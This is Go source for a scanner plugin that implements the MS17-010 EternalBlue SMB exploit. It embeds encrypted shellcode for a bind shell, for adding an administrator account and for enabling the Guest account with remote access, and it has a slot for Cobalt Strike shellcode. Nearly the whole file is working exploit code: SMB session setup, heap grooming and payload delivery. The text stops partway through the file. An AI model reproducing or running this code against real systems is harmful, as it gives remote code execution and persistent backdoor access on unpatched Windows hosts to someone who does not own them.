package Plugins

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"github.com/shadow1ng/fscan/Common"
	"io"
	"io/ioutil"
	"net"
	"strings"
	"time"
)

// MS17010EXP executes the MS17-010 exploit
func MS17010EXP(info *Common.HostInfo) {
	address := info.Host + ":445"
	var sc string

	// Select shellcode based on type
	switch Common.Shellcode {
	case "bind":
		// Bind Shell generated by msfvenom, listening on port 64531
		sc_enc := "gUYe7vm5/MQzTkSyKvpMFImS/YtwI+HxNUDd7MeUKDIxBZ8nsaUtdMEXIZmlZUfoQacylFEZpu7iWBRpQZw0KElIFkZR9rl4fpjyYNhEbf9JdquRrvw4hYMypBbfDQ6MN8csp1QF5rkMEs6HvtlKlGSaff34Msw6RlvEodROjGYA+mHUYvUTtfccymIqiU7hCFn+oaIk4ZtCS0Mzb1S5K5+U6vy3e5BEejJVA6u6I+EUb4AOSVVF8GpCNA91jWD1AuKcxg0qsMa+ohCWkWsOxh1zH0kwBPcWHAdHIs31g26NkF14Wl+DHStsW4DuNaxRbvP6awn+wD5aY/1QWlfwUeH/I+rkEPF18sTZa6Hr4mrDPT7eqh4UrcTicL/x4EgovNXA9X+mV6u1/4Zb5wy9rOVwJ+agXxfIqwL5r7R68BEPA/fLpx4LgvTwhvytO3w6I+7sZS7HekuKayBLNZ0T4XXeM8GpWA3h7zkHWjTm41/5JqWblQ45Msrg+XqD6WGvGDMnVZ7jE3xWIRBR7MrPAQ0Kl+Nd93/b+BEMwvuinXp1viSxEoZHIgJZDYR5DykQLpexasSpd8/WcuoQQtuTTYsJpHFfvqiwn0djgvQf3yk3Ro1EzjbR7a8UzwyaCqtKkCu9qGb+0m8JSpYS8DsjbkVST5Y7ZHtegXlX1d/FxgweavKGz3UiHjmbQ+FKkFF82Lkkg+9sO3LMxp2APvYz2rv8RM0ujcPmkN2wXE03sqcTfDdjCWjJ/evdrKBRzwPFhjOjUX1SBVsAcXzcvpJbAf3lcPPxOXM060OYdemu4Hou3oECjKP2h6W9GyPojMuykTkcoIqgN5Ldx6WpGhhE9wrfijOrrm7of9HmO568AsKRKBPfy/QpCfxTrY+rEwyzFmU1xZ2lkjt+FTnsMJY8YM7sIbWZauZ2S+Ux33RWDf7YUmSGlWC8djqDKammk3GgkSPHjf0Qgknukptxl977s2zw4jdh8bUuW5ap7T+Wd/S0ka90CVF4AyhonvAQoi0G1qj5gTih1FPTjBpf+FrmNJvNIAcx2oBoU4y48c8Sf4ABtpdyYewUh4NdxUoL7RSVouU1MZTnYS9BqOJWLMnvV7pwRmHgUz3fe7Kx5PGnP/0zQjW/P/vgmLMh/iBisJIGF3JDGoULsC3dabGE5L7sXuCNePiOEJmgwOHlFBlwqddNaE+ufor0q4AkQBI9XeqznUfdJg2M2LkUZOYrbCjQaE7Ytsr3WJSXkNbOORzqKo5wIf81z1TCow8QuwlfwIanWs+e8oTavmObV3gLPoaWqAIUzJqwD9O4P6x1176D0Xj83n6G4GrJgHpgMuB0qdlK"
		var err error
		sc, err = AesDecrypt(sc_enc, key)
		if err != nil {
			Common.LogError(fmt.Sprintf("%s MS17-010 failed to decrypt bind shellcode: %v", info.Host, err))
			return
		}

	case "cs":
		// Shellcode generated by Cobalt Strike
		sc = ""

	case "add":
		// Add system administrator account and configure remote access
		sc_enc := "Teobs46+kgUn45BOBbruUdpBFXs8uKXWtvYoNbWtKpNCtOasHB/5Er+C2ZlALluOBkUC6BQVZHO1rKzuygxJ3n2PkeutispxSzGcvFS3QJ1EU517e2qOL7W2sRDlNb6rm+ECA2vQZkTZBAboolhGfZYeM6v5fEB2L1Ej6pWF5CKSYxjztdPF8bNGAkZsQhUAVW7WVKysZ1vbghszGyeKFQBvO9Hiinq/XiUrLBqvwXLsJaybZA44wUFvXC0FA9CZDOSD3MCX2arK6Mhk0Q+6dAR+NWPCQ34cYVePT98GyXnYapTOKokV6+hsqHMjfetjkvjEFohNrD/5HY+E73ihs9TqS1ZfpBvZvnWSOjLUA+Z3ex0j0CIUONCjHWpoWiXAsQI/ryJh7Ho5MmmGIiRWyV3l8Q0+1vFt3q/zQGjSI7Z7YgDdIBG8qcmfATJz6dx7eBS4Ntl+4CCqN8Dh4pKM3rV+hFqQyKnBHI5uJCn6qYky7p305KK2Z9Ga5nAqNgaz0gr2GS7nA5D/Cd8pvUH6sd2UmN+n4HnK6/O5hzTmXG/Pcpq7MTEy9G8uXRfPUQdrbYFP7Ll1SWy35B4n/eCf8swaTwi1mJEAbPr0IeYgf8UiOBKS/bXkFsnUKrE7wwG8xXaI7bHFgpdTWfdFRWc8jaJTvwK2HUK5u+4rWWtf0onGxTUyTilxgRFvb4AjVYH0xkr8mIq8smpsBN3ff0TcWYfnI2L/X1wJoCH+oLi67xOs7UApLzuCcE52FhTIjY+ckzBVinUHHwwc4QyY6Xo/15ATcQoL7ZiQgii3xFhrJQGnHgQBsmqT/0A1YBa+rrvIIzblF3FDRlXwAvUVTKnCjDJV9NeiS78jgtx6TNlBDyKCy29E3WGbMKSMH2a+dmtjBhmJ94O8GnbrHyd5c8zxsNXRBaYBV/tVyB9TDtM9kZk5QTit+xN2wOUwFa9cNbpYak8VH552mu7KISA1dUPAMQm9kF5vDRTRxjVLqpqHOc+36lNi6AWrGQkXNKcZJclmO7RotKdtPtCayNGV7/pznvewyGgEYvRKprmzf6hl+9acZmnyQZvlueWeqf+I6axiCyHqfaI+ADmz4RyJOlOC5s1Ds6uyNs+zUXCz7ty4rU3hCD8N6v2UagBJaP66XCiLOL+wcx6NJfBy40dWTq9RM0a6b448q3/mXZvdwzj1Evlcu5tDJHMdl+R2Q0a/1nahzsZ6UMJb9GAvMSUfeL9Cba77Hb5ZU40tyTQPl28cRedhwiISDq5UQsTRw35Z7bDAxJvPHiaC4hvfW3gA0iqPpkqcRfPEV7d+ylSTV1Mm9+NCS1Pn5VDIIjlClhlRf5l+4rCmeIPxQvVD/CPBM0NJ6y1oTzAGFN43kYqMV8neRAazACczYqziQ6VgjATzp0k8"
		var err error
		sc, err = AesDecrypt(sc_enc, key)
		if err != nil {
			Common.LogError(fmt.Sprintf("%s MS17-010 failed to decrypt add shellcode: %v", info.Host, err))
			return
		}

	case "guest":
		// Activate Guest account and configure remote access
		sc_enc := "Teobs46+kgUn45BOBbruUdpBFXs8uKXWtvYoNbWtKpNCtOasHB/5Er+C2ZlALluOBkUC6BQVZHO1rKzuygxJ3n2PkeutispxSzGcvFS3QJ1EU517e2qOL7W2sRDlNb6rm+ECA2vQZkTZBAboolhGfZYeM6v5fEB2L1Ej6pWF5CKSYxjztdPF8bNGAkZsQhUAVW7WVKysZ1vbghszGyeKFQBvO9Hiinq/XiUrLBqvwXLsJaybZA44wUFvXC0FA9CZDOSD3MCX2arK6Mhk0Q+6dAR+NWPCQ34cYVePT98GyXnYapTOKokV6+hsqHMjfetjkvjEFohNrD/5HY+E73ihs9TqS1ZfpBvZvnWSOjLUA+Z3ex0j0CIUONCjHWpoWiXAsQI/ryJh7Ho5MmmGIiRWyV3l8Q0+1vFt3q/zQGjSI7Z7YgDdIBG8qcmfATJz6dx7eBS4Ntl+4CCqN8Dh4pKM3rV+hFqQyKnBHI5uJCn6qYky7p305KK2Z9Ga5nAqNgaz0gr2GS7nA5D/Cd8pvUH6sd2UmN+n4HnK6/O5hzTmXG/Pcpq7MTEy9G8uXRfPUQdrbYFP7Ll1SWy35B4n/eCf8swaTwi1mJEAbPr0IeYgf8UiOBKS/bXkFsnUKrE7wwG8xXaI7bHFgpdTWfdFRWc8jaJTvwK2HUK5u+4rWWtf0onGxTUyTilxgRFvb4AjVYH0xkr8mIq8smpsBN3ff0TcWYfnI2L/X1wJoCH+oLi67xMN+yPDirT+LXfLOaGlyTqG6Yojge8Mti/BqIg5RpG4wIZPKxX9rPbMP+Tzw8rpi/9b33eq0YDevzqaj5Uo0HudOmaPwv5cd9/dqWgeC7FJwv73TckogZGbDOASSoLK26AgBat8vCrhrd7T0uBrEk+1x/NXvl5r2aEeWCWBsULKxFh2WDCqyQntSaAUkPe3JKJe0HU6inDeS4d52BagSqmd1meY0Rb/97fMCXaAMLekq+YrwcSrmPKBY9Yk0m1kAzY+oP4nvV/OhCHNXAsUQGH85G7k65I1QnzffroaKxloP26XJPW0JEq9vCSQFI/EX56qt323V/solearWdBVptG0+k55TBd0dxmBsqRMGO3Z23OcmQR4d8zycQUqqavMmo32fy4rjY6Ln5QUR0JrgJ67dqDhnJn5TcT4YFHgF4gY8oynT3sqv0a+hdVeF6XzsElUUsDGfxOLfkn3RW/2oNnqAHC2uXwX2ZZNrSbPymB2zxB/ET3SLlw3skBF1A82ZBYqkMIuzs6wr9S9ox9minLpGCBeTR9j6OYk6mmKZnThpvarRec8a7YBuT2miU7fO8iXjhS95A84Ub++uS4nC1Pv1v9nfj0/T8scD2BUYoVKCJX3KiVnxUYKVvDcbvv8UwrM6+W/hmNOePHJNx9nX1brHr90m9e40as1BZm2meUmCECxQd+Hdqs7HgPsPLcUB8AL8wCHQjziU6R4XKuX6ivx"
		var err error
		sc, err = AesDecrypt(sc_enc, key)
		if err != nil {
			Common.LogError(fmt.Sprintf("%s MS17-010 failed to decrypt guest shellcode: %v", info.Host, err))
			return
		}

	default:
		// Read shellcode from file or use provided shellcode
		if strings.Contains(Common.Shellcode, "file:") {
			read, err := ioutil.ReadFile(Common.Shellcode[5:])
			if err != nil {
				Common.LogError(fmt.Sprintf("MS17010 failed to read Shellcode file %v: %v", Common.Shellcode, err))
				return
			}
			sc = fmt.Sprintf("%x", read)
		} else {
			sc = Common.Shellcode
		}
	}

	// Validate shellcode
	if len(sc) < 20 {
		fmt.Println("Invalid Shellcode")
		return
	}

	// Decode shellcode
	sc1, err := hex.DecodeString(sc)
	if err != nil {
		Common.LogError(fmt.Sprintf("%s MS17-010 failed to decode Shellcode: %v", info.Host, err))
		return
	}

	// Execute EternalBlue exploit
	err = eternalBlue(address, 12, 12, sc1)
	if err != nil {
		Common.LogError(fmt.Sprintf("%s MS17-010 exploit failed: %v", info.Host, err))
		return
	}

	Common.LogSuccess(fmt.Sprintf("%s\tMS17-010\tExploit completed", info.Host))
}

// eternalBlue executes the EternalBlue exploit
func eternalBlue(address string, initialGrooms, maxAttempts int, sc []byte) error {
	// Check shellcode size
	const maxscSize = packetMaxLen - packetSetupLen - len(loader) - 2 // uint16 length
	scLen := len(sc)
	if scLen > maxscSize {
		return fmt.Errorf("Shellcode size exceeds limit: %d > %d (exceeds by %d bytes)",
			scLen, maxscSize, scLen-maxscSize)
	}

	// Construct kernel user payload
	payload := makeKernelUserPayload(sc)

	// Attempt exploit multiple times
	var (
		grooms int
		err    error
	)
	for i := 0; i < maxAttempts; i++ {
		grooms = initialGrooms + 5*i
		if err = exploit(address, grooms, payload); err == nil {
			return nil // Exploit successful
		}
	}

	return err // Return last attempt's error
}

// exploit executes the core logic of the EternalBlue exploit
func exploit(address string, grooms int, payload []byte) error {
	// Establish SMB1 anonymous IPC connection
	header, conn, err := smb1AnonymousConnectIPC(address)
	if err != nil {
		return fmt.Errorf("Failed to establish SMB connection: %v", err)
	}
	defer func() { _ = conn.Close() }()

	// Send SMB1 large buffer data
	if err = conn.SetReadDeadline(time.Now().Add(10 * time.Second)); err != nil {
		return fmt.Errorf("Failed to set read timeout: %v", err)
	}
	if err = smb1LargeBuffer(conn, header); err != nil {
		return fmt.Errorf("Failed to send large buffer: %v", err)
	}

	// Initialize memory spray thread
	fhsConn, err := smb1FreeHole(address, true)
	if err != nil {
		return fmt.Errorf("Failed to initialize memory spray: %v", err)
	}
	defer func() { _ = fhsConn.Close() }()

	// First round of memory spray
	groomConns, err := smb2Grooms(address, grooms)
	if err != nil {
		return fmt.Errorf("First round of memory spray failed: %v", err)
	}

	// Release memory and perform second round of spray
	fhfConn, err := smb1FreeHole(address, false)
	if err != nil {
		return fmt.Errorf("Failed to release memory: %v", err)
	}
	_ = fhsConn.Close()

	// Perform second round of memory spray
	groomConns2, err := smb2Grooms(address, 6)
	if err != nil {
		return fmt.Errorf("Second round of memory spray failed: %v", err)
	}
	_ = fhfConn.Close()

	// Merge all spray connections
	groomConns = append(groomConns, groomConns2...)
	defer func() {
		for _, conn := range groomConns {
			_ = conn.Close()
		}
	}()

	// Send final exploit packet
	if err = conn.SetReadDeadline(time.Now().Add(10 * time.Second)); err != nil {
		return fmt.Errorf("Failed to set read timeout: %v", err)
	}

	finalPacket := makeSMB1Trans2ExploitPacket(header.TreeID, header.UserID, 15, "exploit")
	if _, err = conn.Write(finalPacket); err != nil {
		return fmt.Errorf("Failed to send exploit packet: %v", err)
	}

	// Get response and check status
	raw, _, err := smb1GetResponse(conn)
	if err != nil {
		return fmt.Errorf("Failed to get exploit response: %v", err)
	}

	// Extract NT status code
	ntStatus := []byte{raw[8], raw[7], raw[6], raw[5]}
	Common.LogSuccess(fmt.Sprintf("NT Status: 0x%08X", ntStatus))

	// Send payload
	Common.LogSuccess("Starting to send Payload")
	body := makeSMB2Body(payload)

	// Send payload in segments
	for _, conn := range groomConns {
		if _, err = conn.Write(body[:2920]); err != nil {
			return fmt.Errorf("Failed to send first segment of Payload: %v", err)
		}
	}

	for _, conn := range groomConns {
		if _, err = conn.Write(body[2920:4073]); err != nil {
			return fmt.Errorf("Failed to send second segment of Payload: %v", err)
		}
	}

	Common.LogSuccess("Payload sent successfully")
	return nil
}

// makeKernelUserPayload constructs the kernel user payload
func makeKernelUserPayload(sc []byte) []byte {
	// Create buffer
	buf := bytes.Buffer{}

	// Write loader code
	buf.Write(loader[:])

	// Write shellcode size (uint16)
	size := make([]byte, 2)
	binary.LittleEndian.PutUint16(size, uint16(len(sc)))
	buf.Write(size)

	// Write shellcode content
	buf.Write(sc)

	return buf.Bytes()
}

// smb1AnonymousConnectIPC creates an SMB1 anonymous IPC connection
func smb1AnonymousConnectIPC(address string) (*smbHeader, net.Conn, error) {
	// Establish TCP connection
	conn, err := net.DialTimeout("tcp", address, 10*time.Second)
	if err != nil {
		return nil, nil, fmt.Errorf("Failed to connect to target: %v", err)
	}

	// Connection status flag
	var ok bool
	defer func() {
		if !ok {
			_ = conn.Close()
		}
	}()

	// SMB protocol negotiation
	if err = smbClientNegotiate(conn); err != nil {
		return nil, nil, fmt.Errorf("SMB protocol negotiation failed: %v", err)
	}

	// Anonymous login
	raw, header, err := smb1AnonymousLogin(conn)
	if err != nil {
		return nil, nil, fmt.Errorf("Anonymous login failed: %v", err)
	}

	// Get system version information
	if _, err = getOSName(raw); err != nil {
		return nil, nil, fmt.Errorf("Failed to get system information: %v", err)
	}

	// Connect to IPC share
	header, err = treeConnectAndX(conn, address, header.UserID)
	if err != nil {
		return nil, nil, fmt.Errorf("Failed to connect to IPC share: %v", err)
	}

	ok = true
	return header, conn, nil
}

// SMB header size constant
const smbHeaderSize = 32

// smbHeader represents the SMB protocol header structure
type smbHeader struct {
	ServerComponent [4]byte // Server component identifier
	SMBCommand      uint8   // SMB command code
	ErrorClass      uint8   // Error class
	Reserved        byte    // Reserved byte
	ErrorCode       uint16  // Error code
	Flags           uint8   // Flags
	Flags2          uint16  // Extended flags
	ProcessIDHigh   uint16  // Process ID high
	Signature       [8]byte // Signature
	Reserved2       [2]byte // Reserved bytes
	TreeID          uint16  // Tree ID
	ProcessID       uint16  // Process ID
	UserID          uint16  // User ID
	MultiplexID     uint16  // Multiplex ID
}

// smb1GetResponse retrieves the SMB1 protocol response data
func smb1GetResponse(conn net.Conn) ([]byte, *smbHeader, error) {
	// Read NetBIOS session service header
	buf := make([]byte, 4)
	if _, err := io.ReadFull(conn, buf); err != nil {
		return nil, nil, fmt.Errorf("Failed to read NetBIOS session service header: %v", err)
	}

	// Validate message type
	messageType := buf[0]
	if messageType != 0x00 {
		return nil, nil, fmt.Errorf("Invalid message type: 0x%02X", messageType)
	}

	// Parse message body size
	sizeBuf := make([]byte, 4)
	copy(sizeBuf[1:], buf[1:])
	messageSize := int(binary.BigEndian.Uint32(sizeBuf))

	// Read SMB message body
	buf = make([]byte, messageSize)
	if _, err := io.ReadFull(conn, buf); err != nil {
		return nil, nil, fmt.Errorf("Failed to read SMB message body: %v", err)
	}

	// Parse SMB header
	header := smbHeader{}
	reader := bytes.NewReader(buf[:smbHeaderSize])
	if err := binary.Read(reader, binary.LittleEndian, &header); err != nil {
		return nil, nil, fmt.Errorf("Failed to parse SMB header: %v", err)
	}

	return buf, &header, nil
}

// smbClientNegotiate performs SMB protocol negotiation
func smbClientNegotiate(conn net.Conn) error {
	buf := bytes.Buffer{}

	// Construct NetBIOS session service header
	if err := writeNetBIOSHeader(&buf); err != nil {
		return fmt.Errorf("Failed to construct NetBIOS header: %v", err)
	}

	// Construct SMB protocol header
	if err := writeSMBHeader(&buf); err != nil {
		return fmt.Errorf("Failed to construct SMB header: %v", err)
	}

	// Construct protocol negotiation request
	if err := writeNegotiateRequest(&buf); err != nil {
		return fmt.Errorf("Failed to construct protocol negotiation request: %v", err)
	}

	// Send data packet
	if _, err := buf.WriteTo(conn); err != nil {
		return fmt.Errorf("Failed to send protocol negotiation data packet: %v", err)
	}

	// Get response
	if _, _, err := smb1GetResponse(conn); err != nil {
		return fmt.Errorf("Failed to get protocol negotiation response: %v", err)
	}

	return nil
}

// writeNetBIOSHeader writes the NetBIOS session service header
func writeNetBIOSHeader(buf *bytes.Buffer) error {
	// Message type: Session Message
	buf.WriteByte(0x00)
	// Length (fixed value)
	buf.Write([]byte{0x00, 0x00, 0x54})
	return nil
}

// writeSMBHeader writes the SMB protocol header
func writeSMBHeader(buf *bytes.Buffer) error {
	// SMB protocol identifier: .SMB
	buf.Write([]byte{0xFF, 0x53, 0x4D, 0x42})
	// Command: Negotiate Protocol
	buf.WriteByte(0x72)
	// NT status code
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// Flags
	buf.WriteByte(0x18)
	// Flags2
	buf.Write([]byte{0x01, 0x28})
	// Process ID high
	buf.Write([]byte{0x00, 0x00})
	// Signature
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
	// Reserved field
	buf.Write([]byte{0x00, 0x00})
	// Tree ID
	buf.Write([]byte{0x00, 0x00})
	// Process ID
	buf.Write([]byte{0x2F, 0x4B})
	// User ID
	buf.Write([]byte{0x00, 0x00})
	// Multiplex ID
	buf.Write([]byte{0xC5, 0x5E})
	return nil
}

// writeNegotiateRequest writes the protocol negotiation request
func writeNegotiateRequest(buf *bytes.Buffer) error {
	// Field count
	buf.WriteByte(0x00)
	// Byte count
	buf.Write([]byte{0x31, 0x00})

	// Write supported dialects
	dialects := [][]byte{
		{0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x31, 0x2E, 0x30, 0x00},                         // LAN MAN1.0
		{0x4C, 0x4D, 0x31, 0x2E, 0x32, 0x58, 0x30, 0x30, 0x32, 0x00},                         // LM1.2X002
		{0x4E, 0x54, 0x20, 0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x20, 0x31, 0x2E, 0x30, 0x00}, // NT LAN MAN 1.0
		{0x4E, 0x54, 0x20, 0x4C, 0x4D, 0x20, 0x30, 0x2E, 0x31, 0x32, 0x00},                   // NT LM 0.12
	}

	for _, dialect := range dialects {
		buf.WriteByte(0x02) // Dialect marker
		buf.Write(dialect)
	}

	return nil
}

// smb1AnonymousLogin performs SMB1 anonymous login
func smb1AnonymousLogin(conn net.Conn) ([]byte, *smbHeader, error) {
	buf := bytes.Buffer{}

	// Construct NetBIOS session service header
	if err := writeNetBIOSLoginHeader(&buf); err != nil {
		return nil, nil, fmt.Errorf("Failed to construct NetBIOS header: %v", err)
	}

	// Construct SMB protocol header
	if err := writeSMBLoginHeader(&buf); err != nil {
		return nil, nil, fmt.Errorf("Failed to construct SMB header: %v", err)
	}

	// Construct session setup request
	if err := writeSessionSetupRequest(&buf); err != nil {
		return nil, nil, fmt.Errorf("Failed to construct session setup request: %v", err)
	}

	// Send data packet
	if _, err := buf.WriteTo(conn); err != nil {
		return nil, nil, fmt.Errorf("Failed to send login data packet: %v", err)
	}

	// Get response
	return smb1GetResponse(conn)
}

// writeNetBIOSLoginHeader writes the NetBIOS session service header
func writeNetBIOSLoginHeader(buf *bytes.Buffer) error {
	// Message type: Session Message
	buf.WriteByte(0x00)
	// Length
	buf.Write([]byte{0x00, 0x00, 0x88})
	return nil
}

// writeSMBLoginHeader writes the SMB protocol header
func writeSMBLoginHeader(buf *bytes.Buffer) error {
	// SMB identifier
	buf.Write([]byte{0xFF, 0x53, 0x4D, 0x42})
	// Command: Session Setup AndX
	buf.WriteByte(0x73)
	// NT status code
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// Flags
	buf.WriteByte(0x18)
	// Flags2
	buf.Write([]byte{0x07, 0xC0})
	// Process ID high
	buf.Write([]byte{0x00, 0x00})
	// Signature1
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// Signature2
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// Tree ID
	buf.Write([]byte{0x00, 0x00})
	// Process ID
	buf.Write([]byte{0xFF, 0xFE})
	// Reserved field
	buf.Write([]byte{0x00, 0x00})
	// User ID
	buf.Write([]byte{0x00, 0x00})
	// Multiplex ID
	buf.Write([]byte{0x40, 0x00})
	return nil
}

// writeSessionSetupRequest writes the session setup request
func writeSessionSetupRequest(buf *bytes.Buffer) error {
	// Field count
	buf.WriteByte(0x0D)
	// No subsequent command
	buf.WriteByte(0xFF)
	// Reserved field
	buf.WriteByte(0x00)
	// AndX offset
	buf.Write([]byte{0x88, 0x00})
	// Maximum buffer size
	buf.Write([]byte{0x04, 0x11})
	// Maximum multiplex count
	buf.Write([]byte{0x0A, 0x00})
	// VC number
	buf.Write([]byte{0x00, 0x00})
	// Session key
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// ANSI password length
	buf.Write([]byte{0x01, 0x00})
	// Unicode password length
	buf.Write([]byte{0x00, 0x00})
	// Reserved field
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// Capabilities
	buf.Write([]byte{0xD4, 0x00, 0x00, 0x00})
	// Byte count
	buf.Write([]byte{0x4b, 0x00})

	// Authentication information
	buf.WriteByte(0x00)           // ANSI password
	buf.Write([]byte{0x00, 0x00}) // Account name
	buf.Write([]byte{0x00, 0x00}) // Domain name

	// Write OS information
	writeOSInfo(buf)

	return nil
}

// writeOSInfo writes the OS information
func writeOSInfo(buf *bytes.Buffer) {
	// Native OS: Windows 2000 2195
	osInfo := []byte{0x57, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x64, 0x00,
		0x6F, 0x00, 0x77, 0x00, 0x73, 0x00, 0x20, 0x00, 0x32, 0x00,
		0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x20, 0x00, 0x32, 0x00,
		0x31, 0x00, 0x39, 0x00, 0x35, 0x00, 0x00, 0x00}
	buf.Write(osInfo)

	// Native LAN Manager: Windows 2000 5.0
	lanInfo := []byte{0x57, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x64, 0x00,
		0x6F, 0x00, 0x77, 0x00, 0x73, 0x00, 0x20, 0x00, 0x32, 0x00,
		0x30, 0x00, 0x30, 0x00, 0x30, 0x00, 0x20, 0x00, 0x35, 0x00,
		0x2e, 0x00, 0x30, 0x00, 0x00, 0x00}
	buf.Write(lanInfo)
}

// getOSName extracts the OS name from the SMB response
// Skip SMB header, word count, AndX command, reserved field, AndX offset, action flags, byte count, and magic 0x41 (A)
func getOSName(raw []byte) (string, error) {
	// Create buffer to store OS name
	osBuf := bytes.Buffer{}

	// Create reader, position to start of OS name
	reader := bytes.NewReader(raw[smbHeaderSize+10:])

	// Read UTF-16 encoded OS name
	char := make([]byte, 2)
	for {
		if _, err := io.ReadFull(reader, char); err != nil {
			return "", fmt.Errorf("Failed to read OS name: %v", err)
		}

		// Exit on null terminator (0x00 0x00)
		if bytes.Equal(char, []byte{0x00, 0x00}) {
			break
		}

		osBuf.Write(char)
	}

	// Convert UTF-16 to ASCII
	bufLen := osBuf.Len()
	osName := make([]byte, 0, bufLen/2)
	rawBytes := osBuf.Bytes()

	// Extract every second byte (remove UTF-16 high byte)
	for i := 0; i < bufLen; i += 2 {
		osName = append(osName, rawBytes[i])
	}

	return string(osName), nil
}

// treeConnectAndX performs the SMB tree connect request
func treeConnectAndX(conn net.Conn, address string, userID uint16) (*smbHeader, error) {
	buf := bytes.Buffer{}

	// Construct NetBIOS session service header
	if err := writeNetBIOSTreeHeader(&buf); err != nil {
		return nil, fmt.Errorf("Failed to construct NetBIOS header: %v", err)
	}

	// Construct SMB protocol header
	if err := writeSMBTreeHeader(&buf, userID); err != nil {
		return nil, fmt.Errorf("Failed to construct SMB header: %v", err)
	}

	// Construct tree connect request
	if err := writeTreeConnectRequest(&buf, address); err != nil {
		return nil, fmt.Errorf("Failed to construct tree connect request: %v", err)
	}

	// Update packet size
	updatePacketSize(&buf)

	// Send data packet
	if _, err := buf.WriteTo(conn); err != nil {
		return nil, fmt.Errorf("Failed to send tree connect request: %v", err)
	}

	// Get response
	_, header, err := smb1GetResponse(conn)
	if err != nil {
		return nil, fmt.Errorf("Failed to get tree connect response: %v", err)
	}

	return header, nil
}

// writeNetBIOSTreeHeader writes the NetBIOS session service header
func writeNetBIOSTreeHeader(buf *bytes.Buffer) error {
	// Message type
	buf.WriteByte(0x00)
	// Length (to be updated later)
	buf.Write([]byte{0x00, 0x00, 0x00})
	return nil
}

// writeSMBTreeHeader writes the SMB protocol header
func writeSMBTreeHeader(buf *bytes.Buffer, userID uint16) error {
	// SMB identifier
	buf.Write([]byte{0xFF, 0x53, 0x4D, 0x42})
	// Command: Tree Connect AndX
	buf.WriteByte(0x75)
	// NT status code
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00})
	// Flags
	buf.WriteByte(0x18)
	// Flags2
	buf.Write([]byte{0x01, 0x20})
	// Process ID high
	buf.Write([]byte{0x00, 0x00})
	// Signature
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
	// Reserved field
	buf.Write([]byte{0x00, 0x00})

	// Tree ID
	treeIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(treeIDBuf, userID)
	buf.Write(treeIDBuf)

	// Process ID
	buf.Write([]byte{0x2F, 0x4B})

	// User ID
	userIDBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(userIDBuf, userID)
	buf.Write(userIDBuf)

	// Multiplex ID
	buf.Write([]byte{0xC5, 0x5E})
	return nil
}

// writeTreeConnectRequest writes the tree connect request
func writeTreeConnectRequest(buf *bytes.Buffer, address string) error {
	// Field count
	buf.WriteByte(0x04)
	// No subsequent command
	buf.WriteByte(0xFF)
	// Reserved field
	buf.WriteByte(0x00)
	// AndX offset
	buf.Write([]byte{0x00, 0x00})
	// Flags
	buf.Write([]byte{0x00, 0x00})
	// Password length
	buf.Write([]byte{0x01, 0x00})
	// Byte count
	buf.Write([]byte{0x1A, 0x00})
	// Password
	buf.WriteByte(0x00)

	// IPC path
	host, _, err := net.SplitHostPort(address)
	if err != nil {
		return fmt.Errorf("Failed to parse address: %v", err)
	}
	_, _ = fmt.Fprintf(buf, "\\\\%s\\IPC$", host)

	// IPC terminator
	buf.WriteByte(0x00)
	// Service type
	buf.Write([]byte{0x3F, 0x3F, 0x3F, 0x3F, 0x3F, 0x00})

	return nil
}

// updatePacketSize updates the packet size
func updatePacketSize(buf *bytes.Buffer) {
	b := buf.Bytes()
	sizeBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(sizeBuf, uint32(buf.Len()-4))
	copy(b[1:], sizeBuf[1:])
}

// smb1LargeBuffer sends large buffer data packets
func smb1LargeBuffer(conn net.Conn, header *smbHeader) error {
	// Send NT Trans request to get transaction header
	transHeader, err := sendNTTrans(conn, header.TreeID, header.UserID)
	if err != nil {
		return fmt.Errorf("Failed to send NT Trans request: %v", err)
	}

	treeID := transHeader.TreeID
	userID := transHeader.UserID

	// Construct data packets
	var transPackets []byte

	// Add initial Trans2 request packet
	initialPacket := makeSMB1Trans2ExploitPacket(treeID, userID, 0, "zero")
	transPackets = append(transPackets, initialPacket...)

	// Add intermediate Trans2 packets
	for i := 1; i < 15; i++ {
		packet := makeSMB1Trans2ExploitPacket(treeID, userID, i, "buffer")
		transPackets = append(transPackets, packet...)
	}

	// Add Echo packet
	echoPacket := makeSMB1EchoPacket(treeID, userID)
	transPackets = append(transPackets, echoPacket...)

	// Send combined data packets
	if _, err := conn.Write(transPackets); err != nil {
		return fmt.Errorf("Failed to send large buffer data: %v", err)
	}

	// Get response
	if _, _, err := smb1GetResponse(conn); err != nil {
		return fmt.Errorf("Failed to get large buffer response: %v", err)
	}

	return nil
}

// sendNTTrans sends the NT Trans request
func sendNTTrans(conn net.Conn, treeID, userID uint16) (*smbHeader, error) {
	buf := bytes.Buffer{}

	// Construct NetBIOS session service header
	if err := writeNetBIOSNTTransHeader(&buf); err != nil {
		return nil, fmt.Errorf("Failed to construct NetBIOS header: %v", err)
	}

	// Construct SMB protocol header
	if err := writeSMBNTTransHeader(&buf, treeID, userID); err != nil {
		return nil, fmt.Errorf("Failed to construct SMB header: %v", err)
	}

	// Construct NT Trans request
	if err := writeNTTransRequest(&buf); err != nil {
		return nil, fmt.Errorf("Failed to construct NT Trans request: %v", err)
	}

	// Send data packet
	if _, err := buf.WriteTo(conn); err != nil {
		return nil, fmt.Errorf("Failed to send NT Trans request: %v", err)
	}

	// Get response
	_, header, err := smb1GetResponse(conn)
	if err != nil {
		return nil, fmt.Errorf("Failed to get NT Trans response: %v", err)
	}

	return header, nil
}

// writeNetBIOSNTTransHeader writes the NetBIOS session service header
